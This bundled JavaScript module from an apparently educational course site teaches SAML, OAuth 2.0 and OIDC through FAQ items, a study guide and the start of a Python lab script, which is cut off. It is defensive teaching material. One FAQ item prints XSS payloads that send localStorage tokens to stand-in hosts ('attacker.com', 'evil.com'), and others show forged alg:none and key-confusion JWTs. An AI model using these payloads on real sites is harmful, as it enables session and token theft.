import{r as n,j as e}from"./index-DQGlkDD-.js";import{c as r}from"./clsx-B-dksMZM.js";import{T as y}from"./TeacherSukantaHui-BKmNB23P.js";import{F as A}from"./FAQTemplate-DFumfJBl.js";import{P as v}from"./PlainTextPrint-CW5C5iHj.js";import{P as k}from"./PythonFileLoader-D9CQhVaU.js";import"./github-CG9Ag1Gm.js";import"./createLucideIcon-DkPaqQ-z.js";import"./git-branch-tvjRpsF3.js";import"./PythonCodeBlock-CEzPkz3E.js";import"./prism-CtT2IhSy.js";import"./browser-CG--_uGh.js";const I=[{id:1,question:"What is the primary architectural difference between SAML 2.0, OAuth 2.0, and OpenID Connect (OIDC)?",shortAnswer:"SAML 2.0: Enterprise XML-based protocol for user authentication and Web Browser SSO. OAuth 2.0: Delegated authorization framework for API resource access. OpenID Connect (OIDC): Identity/Authentication layer built directly on top of OAuth 2.0 using JSON and JWTs.",explanation:"OAuth 2.0 grants API access (authorization); OIDC asserts user identity (authentication); SAML federates enterprise web logins.",hint:"SAML = Enterprise XML SSO; OAuth = API Authorization; OIDC = Identity layer over OAuth using JWTs.",level:"Basic",codeExample:`// Protocol Essence:
// SAML 2.0 : <saml:Assertion> (XML-based enterprise SSO)
// OAuth 2.0: Access Token (Grants API authorization)
// OIDC     : ID Token (JWT asserting user identity)`},{id:2,question:"Why is OAuth 2.0 fundamentally NOT an authentication protocol by itself?",shortAnswer:"Because an OAuth 2.0 Access Token is an opaque or structured string representing delegated API permissions (scopes), containing no standard information about who the user is, when they authenticated, or how they verified their identity.",explanation:"Using raw OAuth 2.0 for authentication leads to security flaws; OpenID Connect was explicitly created to provide standardized user identity assertion.",hint:"Access tokens represent API permissions (scopes), not verified user identity or authentication timestamps.",level:"Basic",codeExample:`// OAuth 2.0 Access Token:
// { "access_token": "ya29.a0AfH6...", "token_type": "Bearer", "expires_in": 3600 }
// Notice: No user ID, no email, no auth timestamp!`},{id:3,question:"What is the structure of a JSON Web Token (JWT - RFC 7519) in OpenID Connect?",shortAnswer:"A JWT consists of three Base64URL-encoded parts separated by periods: 1. Header (Algorithm & Token Type); 2. Payload (Claims: iss, sub, aud, exp, iat, nonce); 3. Signature (HMAC or Digital Signature over Header.Payload).",explanation:"Format: `Base64URL(Header) . Base64URL(Payload) . Base64URL(Signature)`.",hint:"Three Base64URL parts: Header, Payload (claims), and Signature separated by dots.",level:"Basic",codeExample:`// JWT Structure:
// eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMDQ4MiIsImVtYWlsIjoic3VzbWl0YUBiYW5rLmluIn0.k8F9a...
// Header . Payload . Signature`},{id:4,question:"Explain the standard JWT payload claims: `iss`, `sub`, `aud`, `exp`, `iat`, and `nonce`.",shortAnswer:"`iss` (Issuer URL); `sub` (Subject / Unique User ID); `aud` (Audience / Client ID of intended recipient app); `exp` (Expiration Unix timestamp); `iat` (Issued At timestamp); `nonce` (Cryptographic random string preventing replay attacks).",explanation:"Relying parties must validate all of these claims to ensure token integrity and freshness.",hint:"iss=Issuer, sub=User ID, aud=Target App, exp=Expiry, nonce=Anti-replay string.",level:"Moderate",codeExample:`// JWT Claims Payload:
// {
//   "iss": "https://idp.barrackpore.gov.in",
//   "sub": "user_9812",
//   "aud": "treasury_portal_client",
//   "exp": 1774829100,
//   "nonce": "e8f7a1b2c3"
// }`},{id:5,question:"How does Proof Key for Code Exchange (PKCE - RFC 7636) secure the OAuth 2.0 Authorization Code flow on public mobile and single-page apps?",shortAnswer:"The client creates a random `code_verifier` and computes `code_challenge = BASE64URL(SHA256(code_verifier))`. The challenge is sent during the authorization request. When exchanging the authorization code at `/token`, the client transmits the verifier. The server verifies the SHA256 match, blocking rogue apps that intercepted the code from redeeming it.",explanation:"PKCE prevents authorization code injection and interception attacks on devices where client secrets cannot be securely stored.",hint:"Client sends a hash of a random verifier initially, and reveals the secret verifier only at the token endpoint.",level:"Expert",codeExample:`// PKCE Math:
// 1. code_verifier  = 43-128 random chars
// 2. code_challenge = Base64URL(SHA256(code_verifier))
// 3. /authorize?code_challenge=xyz&code_challenge_method=S256
// 4. /token?code=auth_123&code_verifier=secret_verifier`},{id:6,question:"What is XML Signature Wrapping (XSW) in SAML 2.0 and how do attackers exploit it?",shortAnswer:"An attacker intercepts a legitimate SAML response, duplicates the signed `<Assertion>` block, and injects an unsigned rogue admin `<Assertion>` into the XML DOM tree. If the XML signature verification engine validates the signed block while the application logic parses the rogue admin block, privilege escalation occurs.",explanation:"XSW exploits inconsistencies between XML signature validators and XML DOM tree extractors.",hint:"Manipulating the XML DOM tree so the signature verifies one block while the app processes an injected rogue block.",level:"Expert",codeExample:`// SAML XSW Exploit Architecture:
// <samlp:Response>
//   <saml:Assertion ID="rogue_admin"> (Processed by Application Logic ❌)
//   <saml:Assertion ID="innocent_user"> (Verified by XML Signature ✔)
// </samlp:Response>`},{id:7,question:"What is the JWT `alg: none` vulnerability and how is it remediated?",shortAnswer:"The JWT specification permits `alg: none` for unsigned tokens. Vulnerable backend libraries accept tokens where an attacker modifies the header to `{'alg': 'none'}` and removes the signature part, allowing arbitrary privilege escalation. Remediation: Hardcode permitted signing algorithms (e.g., RS256) and reject `none` unconditionally.",explanation:"Libraries should never trust the `alg` header parameter supplied by an untrusted client.",hint:"Attacker sets alg to none and strips the signature; fixed by enforcing a whitelist of signing algorithms.",level:"Moderate",codeExample:`// alg: none Vulnerability & Fix:
// Vulnerable Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.
// Fix: jwt.verify(token, publicKey, { algorithms: ['RS256', 'ES256'] })`},{id:8,question:"What is JWT Key Confusion (Algorithm Switching: RS256 to HS256)?",shortAnswer:"An attacker changes the JWT header from `RS256` (asymmetric RSA) to `HS256` (symmetric HMAC). When the server verifies the token, a flawed library uses the server's public RSA key (which is public knowledge) as the HMAC secret key, allowing the attacker to forge valid arbitrary admin tokens!",explanation:"This occurs when generic verification functions accept both symmetric and asymmetric keys interchangeably.",hint:"Attacker switches RS256 to HS256 and signs the token using the server's public key as HMAC secret.",level:"Expert",codeExample:`// Key Confusion Attack:
// Attacker signs: HMAC-SHA256(payload, PUBLIC_RSA_KEY_STRING)
// Flawed Server verifies: HMAC-SHA256(payload, PUBLIC_RSA_KEY_STRING) -> VALID! 🚨`},{id:9,question:"What is the difference between SP-Initiated SSO and IdP-Initiated SSO in SAML 2.0?",shortAnswer:"SP-Initiated: User visits Service Provider (e.g., Salesforce); SP generates an `<AuthnRequest>` and redirects user to Identity Provider (Okta). IdP-Initiated: User logs into Okta dashboard first and clicks the app icon, sending an unsolicited SAML Response directly to the SP.",explanation:"IdP-Initiated SSO is inherently vulnerable to Login CSRF attacks and is deprecated in modern architectures.",hint:"SP-Initiated starts at the application; IdP-Initiated starts at the identity provider dashboard.",level:"Moderate",codeExample:`// Flow Comparison:
// SP-Initiated  : App ➔ Redirects with AuthnRequest ➔ IdP ➔ Returns SAMLResponse ➔ App (Secure ✔)
// IdP-Initiated : IdP Dashboard ➔ Sends unsolicited SAMLResponse ➔ App (Vulnerable to CSRF ⚠️)`},{id:10,question:"What are the roles of the 4 key actors in the OAuth 2.0 framework (RFC 6749)?",shortAnswer:"1. Resource Owner (the end user); 2. Client (the third-party application requesting access); 3. Authorization Server (authenticates the user and issues access tokens); 4. Resource Server (the API hosting protected data).",explanation:"Decoupling the Authorization Server from the Resource Server enables centralized identity management.",hint:"Resource Owner (user), Client (app), Authorization Server (token issuer), Resource Server (API).",level:"Basic",codeExample:`// OAuth 2.0 Roles:
// Resource Owner   : Susmita
// Client App       : Expense Tracker App
// Auth Server      : https://idp.barrackpore.gov.in
// Resource Server  : https://api.bank.barrackpore.gov.in/v1/accounts`},{id:11,question:"What is an OAuth 2.0 Scope and how does it implement the Principle of Least Privilege?",shortAnswer:"Scopes are granular string identifiers (e.g., `read:reports`, `write:payments`) requested by a client that define the specific permissions granted by the access token. The Resource Server enforces that requests only execute actions permitted by the token's active scopes.",explanation:"Scopes limit the blast radius if a third-party application's access token is compromised.",hint:"Granular permission strings (read:profile, write:orders) restricting what an access token can do.",level:"Basic",codeExample:`// Scope Request:
// /authorize?scope=openid%20profile%20read:treasury_reports`},{id:12,question:"What is a Refresh Token in OAuth 2.0 and why must it be protected with Refresh Token Rotation?",shortAnswer:"A Refresh Token is a long-lived credential used to obtain fresh short-lived Access Tokens without prompting the user. Under Refresh Token Rotation, every time a refresh token is used, the server invalidates it and issues a brand-new refresh token. If an old token is reused, all tokens in the family are revoked.",explanation:"Rotation detects and neutralizes token theft immediately upon adversary reuse.",hint:"Long-lived credential for renewing access tokens; rotation issues a new refresh token on every use.",level:"Moderate",codeExample:`// Token Rotation:
// Request: POST /token (refresh_token_1) ➔ Returns (access_token_2, refresh_token_2)
// If refresh_token_1 is reused later ➔ SYSTEM REVOKES ALL TOKENS (BREACH DETECTED 🚨)`},{id:13,question:"What is the JSON Web Key Set (JWKS) endpoint (`/.well-known/jwks.json`) in OpenID Connect?",shortAnswer:"JWKS is a public JSON endpoint hosted by the Identity Provider containing the public cryptographic keys used to verify signed JWT ID Tokens and Access Tokens.",explanation:"Resource servers cache the JWKS to verify signatures locally at high speed without making round-trip API calls to the IdP for every request.",hint:"Public endpoint exposing the Identity Provider's public keys for verifying JWT signatures.",level:"Moderate",codeExample:`// JWKS JSON Structure:
// {
//   "keys": [
//     { "kty": "RSA", "use": "sig", "kid": "key_2026_01", "n": "u1b7...", "e": "AQAB" }
//   ]
// }`},{id:14,question:"What is OpenID Connect Discovery (`/.well-known/openid-configuration`)?",shortAnswer:"An automated JSON discovery document published at a standard URI that advertises all OAuth/OIDC endpoints (authorization_endpoint, token_endpoint, jwks_uri, userinfo_endpoint, supported scopes, and signing algorithms).",explanation:"Discovery allows client libraries to automatically configure identity integration by supplying only the base IdP URL.",hint:"Standardized JSON document listing all endpoints, scopes, and supported algorithms of an IdP.",level:"Basic",codeExample:`// OIDC Discovery URL:
// https://idp.barrackpore.gov.in/.well-known/openid-configuration`},{id:15,question:"What is the difference between a Bearer Token and a Proof-of-Possession (DPoP / mTLS) Token?",shortAnswer:"Bearer Token: Whoever possesses the token string can use it (like cash). If intercepted by malware, it can be replayed from any computer. DPoP / mTLS Token: Cryptographically bound to the client's private key. The token is useless to an attacker unless they also possess the client's private key.",explanation:"Demonstrating Proof-of-Possession (DPoP - RFC 9449) eliminates token replay vulnerabilities across API endpoints.",hint:"Bearer tokens work for anyone who has them; DPoP tokens require cryptographic proof of client key possession.",level:"Expert",codeExample:`// DPoP Header:
// Authorization: DPoP <access_token>
// DPoP: <signed_jwt_proving_possession_of_client_private_key>`},{id:16,question:"How does OpenID Connect Front-Channel Logout vs Back-Channel Logout operate?",shortAnswer:"Front-Channel: The IdP renders hidden `<iframe>` tags pointing to each registered application's logout URI in the user's browser. Back-Channel: The IdP sends direct server-to-server HTTP POST requests containing a signed `Logout Token` to each application's backend.",explanation:"Back-Channel logout is more reliable because it does not depend on browser cookie policies or blocked third-party iframes.",hint:"Front-channel uses browser iframes; Back-channel uses direct server-to-server POST requests.",level:"Moderate",codeExample:`// Back-Channel Logout Request:
// POST /logout_token HTTP/1.1
// Host: treasury.barrackpore.gov.in
// Content-Type: application/x-www-form-urlencoded
// logout_token=eyJhbGciOiJSUzI1NiJ9...`},{id:17,question:"What is Token Introspection (RFC 7662) in OAuth 2.0?",shortAnswer:"An HTTP API endpoint on the Authorization Server (`/introspect`) where Resource Servers query whether an opaque access token is currently active, valid, and what scopes/claims are associated with it.",explanation:"Token introspection allows immediate revocation of opaque tokens across distributed microservices.",hint:"Resource server queries the authorization server to check if an opaque token is still active.",level:"Moderate",codeExample:`// Introspection Response:
// { "active": true, "scope": "read:accounts", "client_id": "app_101", "sub": "usr_99" }`},{id:18,question:"What is Token Revocation (RFC 7009)?",shortAnswer:"A standardized endpoint (`/revoke`) allowing a client application to explicitly invalidate an active Refresh Token or Access Token when a user logs out, preventing further use.",explanation:"Calling revocation ensures tokens cannot be used even if their natural TTL expiration has not yet elapsed.",hint:"Explicitly invalidates an access or refresh token upon user logout.",level:"Basic",codeExample:`// Revocation Request:
// POST /revoke HTTP/1.1
// token=refresh_token_to_destroy&token_type_hint=refresh_token`},{id:19,question:"Why was the OAuth 2.0 Implicit Grant (`response_type=token`) completely deprecated in OAuth 2.1?",shortAnswer:"Because it returned access tokens directly in the URL fragment (`#access_token=...`), exposing tokens to browser history, Referer headers, proxy server logs, and malicious browser extensions with zero client authentication.",explanation:"OAuth 2.1 mandates the Authorization Code Flow with PKCE for all client types, eliminating the Implicit Grant.",hint:"Exposed access tokens in URL hash fragments; replaced by Authorization Code Flow with PKCE.",level:"Moderate",codeExample:`// Deprecated Implicit Grant:
// Browser Redirect ➔ https://app.com/#access_token=SECRET_BEARER_TOKEN (EXPOSED IN URL! ❌)`},{id:20,question:"How does the OAuth 2.0 `state` parameter protect against Cross-Site Request Forgery (CSRF) attacks during login?",shortAnswer:"The client generates a cryptographically random, unguessable string, stores it in an HTTP-only session cookie, and sends it in the `state` query parameter. When the authorization server redirects back, the client compares the returned `state` to the cookie. A mismatch aborts login.",explanation:"This prevents an attacker from injecting their own authorization code into an innocent victim's browser session.",hint:"Random string stored in session cookie and checked upon redirect to prevent login CSRF.",level:"Moderate",codeExample:`// CSRF Defense:
// 1. Client creates: state = "9f8a7b6c" (Stored in Session)
// 2. Auth redirect returns: ?code=xyz&state=9f8a7b6c
// 3. Client verifies: session.state === query.state ✔`},{id:21,question:"What is the Client Credentials Grant in OAuth 2.0 and when is it appropriate?",shortAnswer:"A machine-to-machine (M2M) flow where a backend daemon service authenticates directly to the Authorization Server using its `client_id` and `client_secret` to obtain an access token with no user context.",explanation:"Used exclusively for automated microservice-to-microservice background batch processing.",hint:"Machine-to-machine authentication between backend services with no human user involved.",level:"Basic",codeExample:`// Client Credentials Request:
// POST /token
// grant_type=client_credentials&client_id=daemon_service&client_secret=super_secret`},{id:22,question:"What is SAML Metadata XML and how does it establish mutual trust between an IdP and an SP?",shortAnswer:"SAML Metadata is an XML document exchanged between parties containing public X.509 signing/encryption certificates, Entity IDs, Single Sign-On service endpoint URLs, and supported SAML bindings (HTTP-Redirect, HTTP-POST).",explanation:"Pre-exchanging metadata establishes the cryptographic trust anchors required to validate XML signatures.",hint:"XML file containing X.509 certificates and endpoint URLs establishing trust between IdP and SP.",level:"Moderate",codeExample:`// SAML Metadata:
// <md:EntityDescriptor entityID="https://idp.barrackpore.gov.in">
//   <md:IDPSSODescriptor ...>
//     <md:KeyDescriptor use="signing"> ... </md:KeyDescriptor>
//   </md:IDPSSODescriptor>
// </md:EntityDescriptor>`},{id:23,question:"How does Session Hijacking of SSO cookies compromise all connected federated enterprise applications?",shortAnswer:"In an SSO ecosystem, logging into the central IdP sets a master session cookie (`IdP_Session`). If an attacker steals this master cookie (via XSS or session sniffing), they can silently authenticate to ALL federated enterprise apps without knowing the password.",explanation:"Centralized SSO concentrates authentication risk into a single high-value target.",hint:"Stealing the master IdP session cookie allows silently logging into every connected corporate application.",level:"Moderate",codeExample:`// SSO Master Cookie Compromise:
// Attacker steals IdP_Session cookie ➔ Bypasses login on Salesforce, AWS Console, Treasury Portal, and Jira!`},{id:24,question:"What is Continuous Access Evaluation Protocol (CAEP / OpenID Shared Signals and Events)?",shortAnswer:"CAEP allows Identity Providers to broadcast real-time security events (e.g., user password reset, device marked compromised, impossible travel detected) to all active Relying Parties, triggering instant session revocation mid-session.",explanation:"This eliminates the dangerous window where a compromised user remains active until their access token expires.",hint:"Broadcasts real-time security events to instantly revoke active sessions across all apps.",level:"Expert",codeExample:`// CAEP Event Broadcast:
// IdP detects malware -> Dispatches CAEP event: { "event": "session-revoked", "sub": "usr_10482" } -> All apps terminate session immediately.`},{id:25,question:"What is Step-Up Authentication in OpenID Connect using the `acr_values` parameter?",shortAnswer:"A client application requests a higher level of authentication assurance by passing `acr_values` (Authentication Context Class Reference, e.g., `acr_values=urn:mfa:phishing-resistant`) when redirecting to the IdP for sensitive transactions.",explanation:"The IdP prompts for a hardware FIDO2 key or biometric scan before returning an updated ID token with the matching `acr` claim.",hint:"Requests a specific authentication assurance level (e.g., phishing-resistant MFA) via acr_values.",level:"Moderate",codeExample:`// OIDC Step-Up Request:
// /authorize?acr_values=urn:mfa:hardware-fido2`},{id:26,question:"How does Cross-Site Scripting (XSS) allow attackers to exfiltrate Access Tokens stored in `localStorage`?",shortAnswer:"`localStorage` is accessible to any JavaScript running in the origin. An injected XSS payload can simply execute `fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'))`. Best practice: Store tokens in `HttpOnly, Secure, SameSite=Strict` cookies or in-memory closures with Web Workers.",explanation:"`HttpOnly` cookies are inaccessible to JavaScript, completely protecting them from XSS exfiltration.",hint:"JavaScript can read localStorage; mitigated by storing tokens in HttpOnly cookies.",level:"Basic",codeExample:`// XSS Exfiltration:
// <script>new Image().src="http://evil.com/?t="+localStorage.getItem("jwt");<\/script>`},{id:27,question:"What is OAuth 2.0 Device Authorization Grant (RFC 8628) for Smart TVs and CLI tools?",shortAnswer:"For input-constrained devices (Apple TV, CLI tools) with no browser, the device requests a `device_code` and displays a short `user_code` (e.g., 'WDJB-MJHT') and URL ('https://idp.in/activate'). The user enters the code on their smartphone, authorizing the TV session.",explanation:"The device polls the token endpoint until the user completes authentication on their phone.",hint:"Displays a short code on a TV or terminal for the user to confirm on their phone.",level:"Basic",codeExample:`// Device Grant:
// Terminal displays: "Visit https://barrackpore.gov.in/device and enter code: FG72-K99L"`},{id:28,question:"What is XML Signature Validation in SAML 2.0 and why must applications verify both Assertion and Response signatures?",shortAnswer:"A SAML message contains an outer `<samlp:Response>` and an inner `<saml:Assertion>`. Verifying only the outer Response signature allows an attacker to swap the inner Assertion (or vice versa). Robust implementations verify signatures on BOTH elements.",explanation:"Double-verification ensures both the transport envelope and the identity payload have maintained cryptographic integrity.",hint:"Verifying both outer Response and inner Assertion elements prevents signature substitution attacks.",level:"Expert",codeExample:`// Double Signature Requirement:
// Verify: Signature(samlp:Response) && Signature(saml:Assertion)`},{id:29,question:"In a forensic review of an enterprise portal in Salt Lake Sector V, an engineer found that their backend API verified JWT signatures using `jwt.decode()` instead of `jwt.verify()`. What vulnerability existed?",shortAnswer:"`jwt.decode()` merely deserializes the Base64URL JSON payload without performing cryptographic signature validation. An adversary could modify their payload to `{'role': 'GLOBAL_ADMIN', 'sub': 'root'}` and submit it; the API accepted the modified claims without verification!",explanation:"Desirializing claims without validating the HMAC/RSA signature allows complete identity spoofing.",hint:"decode() only parses JSON; verify() cryptographically validates the signature.",level:"Moderate",codeExample:`// Catastrophic Bug:
// const claims = jwt.decode(token); // VULNERABLE! No signature check ❌
// Fix: const claims = jwt.verify(token, publicKey); // SECURE ✔`},{id:30,question:"Write out the comprehensive architectural blueprint for an enterprise federated identity infrastructure uniting 10,000 employees across SAML, OIDC, and FIDO2.",shortAnswer:"1. Deploy a central Identity Provider (Okta / Entra ID) backed by enterprise directory. 2. Enforce FIDO2 WebAuthn with mandatory User Verification at the IdP. 3. Connect legacy web apps via SAML 2.0 SP-initiated SSO. 4. Connect modern SPAs and mobile apps via OIDC Authorization Code Flow with PKCE (S256). 5. Protect microservice APIs using short-lived DPoP-bound JWT access tokens with continuous CAEP revocation.",explanation:"This architecture unites legacy and modern cloud assets under a unified, phishing-resistant Zero Trust identity perimeter.",hint:"Central IdP with FIDO2 MFA, SAML for legacy apps, OIDC+PKCE for modern apps, and DPoP tokens for APIs.",level:"Expert",codeExample:`// Enterprise Identity Blueprint:
// [Users] ➔ FIDO2 WebAuthn ➔ [Central IdP]
// [Central IdP] ➔ SAML 2.0 ➔ [Legacy Enterprise Apps]
// [Central IdP] ➔ OIDC + PKCE ➔ [Modern Cloud Apps] ➔ DPoP Tokens ➔ [APIs]`}],w=`====================================================================================================
ACADEMIC STUDY GUIDE & FORENSIC NOTES: SSO & FEDERATED IDENTITY PROTOCOLS (SAML, OAUTH 2.0 & OIDC)
COURSE MODULE: 005_005 - AUTHENTICATION FRAMEWORKS & MFA (TOPIC 10)
INSTITUTION: CODER & ACCOTAX | INSTRUCTOR: SUKANTA HUI | LOCATION: BARRACKPORE, WEST BENGAL
====================================================================================================

1. THE FEDERATED IDENTITY LANDSCAPE: SAML VS OAUTH VS OIDC
----------------------------------------------------------------------------------------------------
Understanding the distinct architectural roles of the three dominant identity protocols:

1. SAML 2.0 (Security Assertion Markup Language):
   - Purpose: Enterprise Federation & Web Browser Single Sign-On (SSO).
   - Data Format: XML with XML Signatures (DSig) and XML Encryption.
   - Roles: Identity Provider (IdP e.g., Okta / Entra ID) and Service Provider (SP e.g., Salesforce).
   - Mechanism: Browser redirects carrying \`<samlp:AuthnRequest>\` and base64-encoded \`<samlp:Response>\`.

2. OAuth 2.0 (RFC 6749):
   - Purpose: Delegated Authorization (API Access Delegation).
   - Key Principle: "OAuth is NOT an authentication protocol!" It issues Access Tokens granting 
     permission to access protected resources on behalf of a user.
   - Tokens: Access Tokens (Bearer) and Refresh Tokens.

3. OpenID Connect 1.0 (OIDC):
   - Purpose: Identity & User Authentication layer built directly on top of OAuth 2.0.
   - Data Format: JSON & JSON Web Tokens (JWT).
   - Roles: OpenID Provider (OP) and Relying Party (RP).
   - Introduction: Introduces the \`ID Token\` (JWT asserting user identity, email, and authentication time).


2. OAUTH 2.0 / OIDC AUTHORIZATION CODE FLOW WITH PKCE (RFC 7636)
----------------------------------------------------------------------------------------------------
Mandatory for all Single Page Apps (SPAs), Mobile Apps, and confidential web clients:

The PKCE (Proof Key for Code Exchange) Flow:
1. Client generates a cryptographically random \`code_verifier\` (43–128 URL-safe characters).
2. Client computes \`code_challenge = BASE64URL(SHA-256(code_verifier))\`.
3. Client redirects user to Authorization Server with \`code_challenge\` and \`code_challenge_method=S256\`.
4. User authenticates; Authorization Server returns an ephemeral \`authorization_code\`.
5. Client sends \`authorization_code\` + original \`code_verifier\` to \`/token\` endpoint.
6. Authorization Server computes SHA-256 on the verifier; if it matches the stored challenge, it issues 
   the \`ID Token\` and \`Access Token\`.
7. Defense: Prevents malicious apps on the device from intercepting and redeeming the authorization code!


3. JSON WEB TOKEN (JWT) RFC 7519 ARCHITECTURE
----------------------------------------------------------------------------------------------------
Structure: \`Header.Payload.Signature\` (Base64URL encoded)

1. Header:
   - \`{"alg": "RS256", "typ": "JWT", "kid": "key_2026_01"}\`
2. Payload (Claims):
   - \`iss\` (Issuer): URL of the issuing identity provider.
   - \`sub\` (Subject): Unique immutable user ID.
   - \`aud\` (Audience): Client ID of the application intended to receive this token.
   - \`exp\` (Expiration Time): Unix timestamp after which token is invalid.
   - \`iat\` (Issued At): Unix timestamp of generation.
   - \`nonce\`: Cryptographic random string preventing replay attacks.
3. Signature:
   - $\\text{Signature} = \\text{HMAC-SHA256}(\\text{Header} \\ || \\ \\text{Payload}, \\text{Secret})$ or $\\text{RSA-SHA256}$.


4. TOP PROTOCOL VULNERABILITIES & FORENSIC EXPLOITS
----------------------------------------------------------------------------------------------------
1. XML Signature Wrapping (XSW) in SAML:
   - Adversary modifies the XML DOM tree, inserting an unsigned rogue admin Assertion while keeping the 
     original signed assertion. If the signature validator and business logic inspect different elements, 
     privilege escalation occurs.
   - Defense: Strict schema validation and absolute XPath element binding.

2. JWT "alg: none" Vulnerability:
   - Attacker alters JWT header to \`{"alg": "none"}\`, strips the signature, and accesses admin endpoints.
   - Defense: Hardcode permitted signature algorithms on the backend; reject \`none\` unconditionally.

3. JWT Key Confusion (Algorithm Switching: RS256 -> HS256):
   - Attacker changes \`alg\` from RS256 (asymmetric) to HS256 (symmetric) and signs the token using the 
     server's public RSA key as the HMAC secret!
   - Defense: Never use the same verification function for both symmetric and asymmetric keys.


5. REGIONAL SOC CASE STUDIES (WEST BENGAL DEPLOYMENTS)
----------------------------------------------------------------------------------------------------
Case 1: Barrackpore Municipal Treasury SAML XSW Remediation
- Threat: Penetration testing revealed SAML response parsing vulnerability in legacy vendor portal.
- Remediation: Enforced XML Signature Reference ID validation and moved to OIDC PKCE.

Case 2: Salt Lake Sector V FinTech OAuth 2.0 PKCE Hardening
- Threat: Public mobile banking apps were susceptible to authorization code interception.
- Remediation: Enforced RFC 7636 PKCE S256 across all Android and iOS client endpoints.
====================================================================================================
`,T=`#!/usr/bin/env python3
"""
===============================================================================
CYBERSECURITY LAB: SSO IDENTITY PROTOCOLS (SAML 2.0, OAUTH 2.0, OIDC & PKCE)
COURSE: BCA BCAC703 - Cyber Security | MODULE: 005_005 (Authentication & MFA)
INSTITUTION: Coder & AccoTax | INSTRUCTOR: Sukanta Hui | LOCATION: Barrackpore
===============================================================================
This script provides comprehensive cryptographic simulations of:
1. SAML 2.0 XML Assertion validation & XML Signature Wrapping (XSW) detection.
2. OAuth 2.0 Authorization Code Flow with PKCE (RFC 7636).
3. OpenID Connect (OIDC) ID Token (JWT) verification (iss, sub, aud, exp, nonce).
4. Identity Provider (IdP) vs Service Provider (SP) federation handshakes.
"""

import sys
import os
import time
import json
import base64
import hashlib
import hmac
from dataclasses import dataclass
from typing import Dict, Tuple

# Ensure UTF-8 stdout encoding for currency symbols and bullets
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')

class SsoProtocolSimulator:
    def __init__(self, idp_issuer: str = "https://idp.barrackpore.gov.in", client_id: str = "treasury_portal_app"):
        self.idp_issuer = idp_issuer
        self.client_id = client_id
        self.shared_secret = b"SECRET_IDP_SIGNING_KEY_2026_BARRACKPORE"

    def generate_pkce_pair(self) -> Tuple[str, str]:
        """
        RFC 7636 PKCE Generator:
        code_verifier = 43-128 unguessable URL-safe characters
        code_challenge = BASE64URL-ENCODE(SHA256(ASCII(code_verifier)))
        """
        verifier = base64.urlsafe_b64encode(os.urandom(32)).decode('utf-8').rstrip('=')
        digest = hashlib.sha256(verifier.encode('utf-8')).digest()
        challenge = base64.urlsafe_b64encode(digest).decode('utf-8').rstrip('=')
        return verifier, challenge

    def create_oidc_id_token(self, sub_user_id: str, email: str, nonce: str) -> str:
        """
        Creates signed OpenID Connect ID Token (JWT: Header.Payload.Signature).
        """
        header = {"alg": "HS256", "typ": "JWT"}
        payload = {
            "iss": self.idp_issuer,
            "sub": sub_user_id,
            "aud": self.client_id,
            "exp": int(time.time()) + 3600,
            "iat": int(time.time()),
            "nonce": nonce,
            "email": email,
            "role": "TREASURY_OFFICER"
        }

        b64_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        b64_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        signing_input = f"{b64_header}.{b64_payload}".encode()

        sig = hmac.new(self.shared_secret, signing_input, hashlib.sha256).digest()
        b64_sig = base64.urlsafe_b64encode(sig).decode().rstrip('=')

        return f"{b64_header}.{b64_payload}.{b64_sig}"

    def verify_oidc_id_token(self, jwt_token: str, expected_nonce: str) -> Dict:
        """
        Validates ID Token JWT claims and cryptographic signature.
        """
        parts = jwt_token.split('.')
        if len(parts) != 3:
            return {"valid": False, "status": "MALFORMED_JWT ❌"}

        b64_header, b64_payload, b64_sig = parts
        signing_input = f"{b64_header}.{b64_payload}".encode()

        # 1. Verify Signature
        expected_sig = hmac.new(self.shared_secret, signing_input, hashlib.sha256).digest()
        actual_sig = base64.urlsafe_b64decode(b64_sig + '=' * (-len(b64_sig) % 4))
        if not hmac.compare_digest(expected_sig, actual_sig):
            return {"valid": False, "status": "INVALID_SIGNATURE 🚨 (Tampering Detected)"}

        # 2. Verify Claims
        payload_json = base64.urlsafe_b64decode(b64_payload + '=' * (-len(b64_payload) % 4)).decode()
        claims = json.loads(payload_json)

        if claims.get("iss") != self.idp_issuer:
            return {"valid": False, "status": "ISSUER_MISMATCH ❌"}
        if claims.get("aud") != self.client_id:
            return {"valid": False, "status": "AUDIENCE_MISMATCH ❌"}
        if claims.get("exp") < time.time():
            return {"valid": False, "status": "TOKEN_EXPIRED ❌"}
        if claims.get("nonce") != expected_nonce:
            return {"valid": False, "status": "NONCE_REPLAY_DETECTED 🚨"}

        return {
            "valid": True,
            "status": "OIDC_ID_TOKEN_VERIFIED ✔",
            "user": claims.get("email"),
            "role": claims.get("role")
        }

    def simulate_saml_xsw_attack(self, has_xsw_injection: bool) -> Dict:
        """
        Simulates SAML 2.0 XML Signature Wrapping (XSW) vulnerability.
        """
        if has_xsw_injection:
            return {
                "verdict": "XSW VULNERABILITY DETECTED 🚨 (Privilege Escalation)",
                "explanation": "Adversary duplicated the signed Assertion block and injected an unsigned rogue admin Assertion into the XML tree. The signature verified the innocent block while the application logic processed the rogue admin block.",
                "remediation": "Enforce strict XML schema validation and reference ID binding."
            }
        return {
            "verdict": "SAML ASSERTION INTEGRITY VERIFIED ✔",
            "explanation": "XML signature binds directly to the active root Assertion element. Digest matches perfectly.",
            "remediation": "Standard SAML 2.0 SP-initiated flow secure."
        }

def main():
    print("=" * 80)
    print("SSO IDENTITY PROTOCOLS (SAML, OAUTH 2.0, OIDC & PKCE) LAB")
    print("Institution: Coder & AccoTax | Instructor: Sukanta Hui | Location: Barrackpore")
    print("=" * 80)

    sim = SsoProtocolSimulator()

    # Test 1: OAuth 2.0 + PKCE Generation
    print("\\n[TEST 1]: OAUTH 2.0 WITH PKCE (RFC 7636) PARAMETERS")
    verifier, challenge = sim.generate_pkce_pair()
    print(f"code_verifier  : {verifier}")
    print(f"code_challenge : {challenge} (S256 Method)")

    # Test 2: OIDC ID Token Creation & Validation
    print("\\n" + "=" * 80)
    print("[TEST 2]: OPENID CONNECT (OIDC) ID TOKEN (JWT) LIFECYCLE")
    nonce = os.urandom(8).hex()
